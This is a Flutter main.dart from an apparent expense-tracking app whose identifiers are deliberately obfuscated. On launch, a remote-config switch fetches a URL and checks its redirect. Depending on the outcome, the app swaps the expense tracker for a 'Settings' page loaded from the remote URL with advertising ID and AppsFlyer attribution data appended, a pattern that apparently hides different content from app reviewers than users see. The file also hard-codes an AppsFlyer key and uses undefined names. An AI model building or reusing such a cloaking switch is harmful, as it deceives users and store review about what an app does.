import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:project5/features/home/pages/gas.dart';
import 'package:project5/features/home/pages/settings_page.dart';
import 'package:project5/features/home/widgets/expense_data.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/expense/models/expense.dart';
import 'features/expense/bloc/expense_bloc.dart';
import 'features/home/widgets/firebase_options.dart';

late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String nfjksdfjkdsf = '';
String cancelPromo = '';
String nfjdskfnsdjkf = '';
String appsflyerId = '';
String njiwefs = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await Hive.initFlutter();
  await Ndas().activate();
  await nfjsdkfndsk();
  Hive.registerAdapter(ExpenseAdapter());
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<void> nfjsdkfndsk() async {
  final TrackingStatus nvjskkds =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(nvjskkds);
}

Future<void> jfklsdjfldsfsd() async {
  await jfsofds();
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'xmcqmbVvE5e4e2UBZ3twRT',
    appId: '6505144818',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    nfjksdfjkdsf = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });
  apsID = await _appsflyerSdk.getAppsFlyerUID() ?? '';
  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<String> jfsofds() async {
  String mfklsdfs = await AppTrackingTransparency.getAdvertisingIdentifier();
  njiwefs = mfklsdfs;
  return mfklsdfs;
}

String njfnsdkfjnsdkf = '';
Future<bool> nfsdjkfkdjsfkds() async {
  final fnjkdsfdskfsdf = FirebaseRemoteConfig.instance;
  await fnjkdsfdskfsdf.fetchAndActivate();
  String njfkdsadfdsjkfs = fnjkdsfdskfsdf.getString('settings');
  String dsdjklfndsjkfsddsfgdg4 = fnjkdsfdskfsdf.getString('darl');
  await jfklsdjfldsfsd();
  final fdhskfsd = HttpClient();
  final vcxxs = Uri.parse(njfkdsadfdsjkfs);
  final ndsfjak = await fdhskfsd.getUrl(vcxxs);
  ndsfjak.followRedirects = false;
  final response = await ndsfjak.close();
  if (response.headers.value(HttpHeaders.locationHeader) !=
      dsdjklfndsjkfsddsfgdg4) {
    nfjdskfnsdjkf = njfkdsadfdsjkfs;
    return true;
  }
  return njfkdsadfdsjkfs.contains('niasd') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<bool>(
        future: nfsdjkfkdjsfkds(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && nfjdskfnsdjkf != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: Settings(
                  fnjskfkjdsf: nfjdskfnsdjkf,
                  bdfshjfdjshf: nfjksdfjkdsf,
                  ndsajkfnsdkjfnkds: njfnsdkfjnsdkf,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => ExpenseBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
